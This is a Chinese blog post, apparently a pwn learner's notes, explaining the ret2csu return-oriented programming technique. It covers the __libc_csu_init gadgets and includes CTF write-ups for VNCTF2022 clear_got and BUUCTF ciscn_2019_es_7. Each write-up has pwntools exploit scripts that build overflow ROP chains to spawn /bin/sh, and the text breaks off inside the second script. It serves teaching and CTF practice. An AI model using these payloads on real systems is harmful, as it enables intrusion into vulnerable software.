@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zikh26.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="关于这个ret2csu，与其说它是一种题型，倒不如说这是一种方法（改变参数）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于学习ret2csu的总结">
+<meta property="og:url" content="https://zikh26.github.io/2022/04/26/ret2csu/index.html">
+<meta property="og:site_name" content="ZIKH26">
+<meta property="og:description" content="关于这个ret2csu，与其说它是一种题型，倒不如说这是一种方法（改变参数）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171725002-1163274691.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171748437-1273885946.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171758126-1557535385.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122321154.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122325203.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122331903.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122337037.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122342789.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122352129.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122358893.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122404423.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122409733.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122413311.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122421151.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122427456.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122433545.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122441266.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122446498.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122449800.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122453288.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122456582.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122504872.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122520003.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411122528116.png">
+<meta property="article:published_time" content="2022-04-26T02:48:05.026Z">
+<meta property="article:modified_time" content="2022-04-26T02:48:05.026Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="学习总结">
+<meta property="article:tag" content="ret2csu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171725002-1163274691.png">
+
+<link rel="canonical" href="https://zikh26.github.io/2022/04/26/ret2csu/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于学习ret2csu的总结 | ZIKH26</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ZIKH26</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">pwn</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/2022/04/26/ret2csu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/20220411214643.jpg">
+      <meta itemprop="name" content="ZIKH26">
+      <meta itemprop="description" content="未来一位优秀的pwner的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于学习ret2csu的总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-26 02:48:05" itemprop="dateCreated datePublished" datetime="2022-04-26T02:48:05+00:00">2022-04-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>关于这个ret2csu，与其说它是一种题型，倒不如说这是一种方法（改变参数）。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="什么是ret2csu？"><a href="#什么是ret2csu？" class="headerlink" title="什么是ret2csu？"></a>什么是ret2csu？</h1><p>这个其实就是在程序中一般都会有一段万能的控制参数的gadgets，里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行，从而达到控制参数的目的。</p>
+<p>#为什么要使用ret2csu？</p>
+<p>就一个目的，因为我们程序里面经常会出现找不到控制rdx和rsi的gadget，因此我们就要使用ret2csu来控制参数。</p>
+<p>#下面是__libc_csu_init的汇编代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">text:0000000000400540                 public __libc_csu_init</span><br><span class="line">.text:0000000000400540 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:0000000000400540 ; __unwind &#123;</span><br><span class="line">.text:0000000000400540                 push    r15</span><br><span class="line">.text:0000000000400542                 push    r14</span><br><span class="line">.text:0000000000400544                 mov     r15d, edi</span><br><span class="line">.text:0000000000400547                 push    r13</span><br><span class="line">.text:0000000000400549                 push    r12</span><br><span class="line">.text:000000000040054B                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552                 push    rbp</span><br><span class="line">.text:0000000000400553                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A                 push    rbx</span><br><span class="line">.text:000000000040055B                 mov     r14, rsi</span><br><span class="line">.text:000000000040055E                 mov     r13, rdx</span><br><span class="line">.text:0000000000400561                 sub     rbp, r12</span><br><span class="line">.text:0000000000400564                 sub     rsp, 8</span><br><span class="line">.text:0000000000400568                 sar     rbp, 3</span><br><span class="line">.text:000000000040056C                 call    _init_proc</span><br><span class="line">.text:0000000000400571                 test    rbp, rbp</span><br><span class="line">.text:0000000000400574                 jz      short loc_400596</span><br><span class="line">.text:0000000000400576                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400578                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596                 add     rsp, 8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br><span class="line">.text:00000000004005A4 ; &#125; // starts at 400540</span><br><span class="line">.text:00000000004005A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<p>#如何利用csu这部分代码？<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171725002-1163274691.png"></p>
+<p>我们利用的其实就是这两部分的代码，我们给这两段起个名字，上面的部分叫gadget2，下面的部分叫gadget1（因为我们先执行下面的部分，因此就叫下面的gadget1吧）</p>
+<p>假设我们现在通过溢出，已经可以控制程序的执行流了，我们此时就把返回地址填写成gadget1的地址0x40059A（因为我们并不需要add rsp,8这个指令，因此直接从0x40059A开始即可）</p>
+<p>现在就会把栈中的前6个数据分别弹给rbx,rbp,r12,r13,r14,r15这六个寄存器。</p>
+<p>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call    qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。</p>
+<p>又因为这三个指令add     rbx,；cmp     rbx, rbp；jnz     short loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.</p>
+<p>然后r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。</p>
+<p>然后r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p>
+<p>接着到了gadget1的结尾ret这里，然后我们紧接着写入gadget2的地址0x400580。<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171748437-1273885946.png"></p>
+<p>此时开始执行这部分代码，这没什么好说的了，就是把r13,r14,r15的值放入rdx,rsi,edi三个寄存器里面。</p>
+<p>然后由于我们前面的rbx是0，加一之后等于了rbp，因此jnz不跳转。那就继续向下执行，如果我们上面call了一个空函数的话，那我们就利用下面的ret。由于继续向下执行，因此又来到了gadget1这里。</p>
+<p><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171758126-1557535385.png"></p>
+<p>如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（7*8你懂得）个垃圾数据即可。</p>
+<p>如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐56字节的数据，以便我们执行最后的ret，最后ret去执行我们想要执行的函数即可。</p>
+<p>整个ret2csu的大致流程就是这样了，我感觉使用这个ret2csu控制参数的时候多下，用的其中的call指令倒不是太多（也可能是我做题少，见的少）</p>
+<p>#实战ret2csu</p>
+<p>下面是我做过三道关于ret2csu的题目，附上WP</p>
+<p>##VNCTF2022公开赛clear_got</p>
+<p>做这道题，必须先掌握下面这三个点。</p>
+<p>1、首先是call指令后面的这个地址（如果是函数名就不说了），就比如现在ret2csu中，准备执行这个</p>
+<p><img src="/upload/img/image-20220411122321154.png" alt="image-20220411122321154"></p>
+<p>我们让rbx为0，此时call r12，那怎么才能call成功呢，原本看到师傅们说是要装got地址，后来发现装一个地址（这个地址是被另一个地址所指向的），然后把r12填写成另一个地址，也可以call成功，再回想一下为什么要装got地址，而不是plt地址，原因也是出现在了got地址仅仅会跳转一次，也就是说填一个got地址，也是会从这个地址去跳到got地址所指向的地址（也就是真实地址（因为延迟绑定的原因，如果不清楚的话，这里请自行百度一下延迟绑定机制）），因此结论就出来了，要想去call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面。</p>
+<p>2、如果我们仅仅是想利用ret2csu去控制参数，而并不想去用call执行，或者说是你想用call执行跳转，但是你找不到去指向你想跳转的那个地址，因此我们用最后的ret跳转（你想跳转到哪里，就填哪的地址即可）。那怎么把call的那一步忽略呢？我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数），这个函数就是_term_proc（注意，这里call的是指向_term_proc的地址，而非term_proc的地址</p>
+<p><img src="/upload/img/image-20220411122325203.png" alt="image-20220411122325203"></p>
+<p>3、怎么去修改rax的值？</p>
+<p>这里提到了一种很巧妙的方法。我们先来看一下read函数和write函数的返回值。</p>
+<p><img src="/upload/img/image-20220411122331903.png" alt="image-20220411122331903"></p>
+<p>图片出自(25条消息) read的返回值卖保险的码农的博客-CSDN博客read函数返回值</p>
+<p>read和write函数 - 故事， - 博客园 (cnblogs.com)</p>
+<p>我们可以看出来read函数和write函数最后的返回值都是实际读到和写入的字节数（如果执行成功的话），而返回值最后就会放到rax里面。也就是说可以利用read和write去控制我们想要的rax。（为啥要控制rax？淦，你只要知道这个控制rax的方法就行了，需要的时候就能用到，就比如这道题）</p>
+<p>掌握上述三点之后，就可以来做题了。</p>
+<img src="/upload/img/image-20220411122337037.png" alt="image-20220411122337037" style="zoom:33%;" />
+
+<img src="/upload/img/image-20220411122342789.png" alt="image-20220411122342789" style="zoom:33%;" />
+
+
+
+<p>发现主函数很简单，buf也是存在溢出，意味着我们可以控制返回地址。</p>
+<img src="/upload/img/image-20220411122352129.png" alt="image-20220411122352129" style="zoom:33%;" />
+
+
+
+
+
+<p>没有发现后门函数和参数，但是发现有两个系统调用，这里很可疑，留意一下。</p>
+<p>这道题的困难点其实在这里<br><img src="/upload/img/image-20220411122358893.png" alt="image-20220411122358893" style="zoom:33%;" /></p>
+<p>Memset清空了0x601008往下面的0x38个字节的内容，我们看一下0x601008是什么<br><img src="/upload/img/image-20220411122404423.png" alt="image-20220411122404423"></p>
+<p>发现居然是got表，got表被清空了意味着什么，1、我们之前已经完成延迟绑定的函数的真实地址已经不在got表了。2、最开始（执行延迟绑定之前）got表原本跳往extern的地址，变成了0。</p>
+<p>也就是说执行了这个memset之后，我们在got表中的所有函数都没法再被使用了。</p>
+<p>但是我们能用的有什么？只剩下了系统调用，可是想用系统调用执行execve(‘&#x2F;bin&#x2F;sh’,0,0)，我们需要做到三件事，第一是控制rax，第二是控制rdi,rsi,rdx这三个寄存器，第三是将&#x2F;bin&#x2F;sh写入到bss段。</p>
+<p>控制rax？，有没有想到最开始提到的那个方法，利用read或者write去修改rax。由于我们还要写入&#x2F;bin&#x2F;sh，因此我们这里采用系统调用read，可是read的系统调用号是0，而程序中出现的两个系统调用没有read，怎么办？其实不用管的，因为main函数的返回值是0，在main函数的ret之前，就把rax的值给设成0了，因此我们溢出之后，始终rax都是0（在执行系统调用之前）。</p>
+<p>既然现在可以系统调用read，那只需要控制参数，将&#x2F;bin&#x2F;sh写入bss段即可，怎么控制参数？用Ropgadget搜索之后发现，没有能控制rsi和rdx的寄存器，因此只能采用ret2csu的方法。</p>
+<p>最后有两点要注意</p>
+<p>第一，  我们系统调用了一次输入，在这次输入里，必须填充到59个字节</p>
+<p>第二，  由于第一次输入最多只能输入0x100个字节，因此我们是没法随心所欲构造gadgets的，要考虑长度限制，因为光垃圾数据都填充了0x68个字节。因此需要考虑两点，第一点，我们两次系统调用（第一次调用read第二次调用system），第二次如果再用ret去返回到系统调用，字节是超了的，因此我们第一次ret进行一下系统调用，然后再ret2csu，这一次在call的时候就要想办法去系统调用，可是我们在这个程序里是找不到指向这个地址的地址。</p>
+<p><img src="/upload/img/image-20220411122409733.png" alt="image-20220411122409733"></p>
+<p>因此我们这里要用一个巧法，在第一次输入的时候，把syscall的这个地址也给写到bss段，这样bss段的地址就指向了syscall。第二点，还是考虑到字节数的问题，为了构造的payload字节更少，我们在ret2csu第二次执行下面的代码的时候，就不填充成垃圾数据，直接填写成第二次系统调用的参数（如果不这样的话，payload太长了，没法全部输入进去）。</p>
+<img src="/upload/img/image-20220411122413311.png" alt="image-20220411122413311" style="zoom:50%;" />
+
+
+
+<p>Exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x4007f3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">offset=<span class="number">0x60</span></span><br><span class="line">syscall_addr=<span class="number">0x40077E</span></span><br><span class="line">write_addr=<span class="number">0x400773</span></span><br><span class="line">csu_gadget1=<span class="number">0x4007EA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4007D0</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601060</span></span><br><span class="line">payload=(offset+<span class="number">8</span>)*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(term_proc)<span class="comment">#r12 空函数#第一次ret2csu的目的是传read函数参数，并且在最后的ret去执行系统调用，第一次不需要用到call，因此call一个空函数</span></span><br><span class="line">payload+=p64(<span class="number">59</span>)<span class="comment">#r13 rdx #执行一次syscall之后，rax就变成了0x3b</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#r14  #rsi  #将/bin/sh写入bss段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15  #rdi</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#下面的48个数据不用垃圾填充，直接进行下一轮涉及参数，这8个垃圾数据填充的是add rsp,8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#此时用call来执行输入到bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>##BUUCTF上的ciscn_2019_es_7</p>
+<img src="/upload/img/image-20220411122421151.png" alt="image-20220411122421151" style="zoom:50%;" />
+
+<img src="/upload/img/image-20220411122427456.png" alt="image-20220411122427456" style="zoom:50%;" />
+
+
+
+
+<p>发现程序流程就是两个系统调用，一个是read，一个是write。</p>
+<img src="/upload/img/image-20220411122433545.png" alt="image-20220411122433545" style="zoom:50%;" />
+
+
+<p>同时发现了这里改变了rax的值，改成了0x3b，也就系统调用execve函数。</p>
+<p>发现只能控制rdi的值，而不能控制rsi,rdx的值</p>
+<p><img src="/upload/img/image-20220411122441266.png" alt="image-20220411122441266"></p>
+<p>那思路就出来了。</p>
+<p>我们利用ret2csu控制rsi和rdx参数，最后执行Mov rax,0x3b；syscall即可。</p>
+<p>那只有一个问题了，也是这道题的难点，怎么把rdi存入参数的地址。</p>
+<p>我最开始想的是执行一个ret2csu去把参数给写进bss段，可是我们由于控制不了rax的值，就没办法系统调用号设置成0,。</p>
+<p>那bss段写不了，只能写入程序给我们指定的地方了，可是这就意味着我们需要泄露栈中地址。以前只遇见过程序自己泄露一个栈的地址的，这道题也算是长见识了，见了一种新方法。</p>
+<p>系统调用write的时候，<br><img src="/upload/img/image-20220411122446498.png" alt="image-20220411122446498"></p>
+<p>第三个参数是0x30，可是我们发现<br><img src="/upload/img/image-20220411122449800.png" alt="image-20220411122449800"></p>
+<p>Buf距离栈底仅仅有十个字节。因此write是可以打印出来栈中内容的。并且我们运行程序也可以发现是有端倪的。</p>
+<p><img src="/upload/img/image-20220411122453288.png" alt="image-20220411122453288"></p>
+<p>不仅仅打印出来了我们输入的东西，还打印出来了一些乱码。</p>
+<p>我们先简单写一个脚本</p>
+<p><img src="/upload/img/image-20220411122456582.png" alt="image-20220411122456582"></p>
+<p>这个脚本就是发送一个1，但是可以看见我们接收的内容。</p>
+<p><img src="/upload/img/image-20220411122504872.png" alt="image-20220411122504872"></p>
+<p>此时可以看见我们已经泄露出来了栈的内容。</p>
+<p>我们用gdb看一下</p>
+<img src="/upload/img/image-20220411122520003.png" alt="image-20220411122520003" style="zoom:50%;" />
+
+
+
+
+<p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p>
+<p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了。</p>
+<p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p>
+<p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少。<br><img src="/upload/img/image-20220411122528116.png" alt="image-20220411122528116"></p>
+<p>F088是泄露的地址，df70是输入存储的首地址（我打算把&#x2F;bin&#x2F;sh输入到这个地方）</p>
+<p>然后就没什么了，偏移拿到之后，就可以写exp了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28000</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span> <span class="comment">#这个地址并不是term_proc的地址，而是指向term_proc的地址</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span 